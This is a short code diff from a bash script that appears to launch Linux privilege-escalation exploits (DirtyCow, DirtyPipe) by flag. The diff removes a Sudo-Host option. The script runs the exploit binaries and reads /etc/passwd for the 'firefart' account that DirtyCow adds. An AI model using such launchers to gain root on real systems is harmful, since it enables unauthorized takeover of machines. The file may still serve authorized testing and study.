@@ -86,11 +86,6 @@ if [[ "$*" == "-DirtyCow" ]]; then
      cat /etc/passwd | grep 'firefart'
 fi
 
-# Sudo-Host
-if [[ "$*" == "-SudoHost" ]]; then
-     "${PWD}/exploit/Sudo-host/exploit.sh"
-fi
-
 # DirtyPipe
 if [[ "$*" == "-DirtyPipe" ]]; then
      ${PWD}/exploit/DirtyPipe/dpipe --root
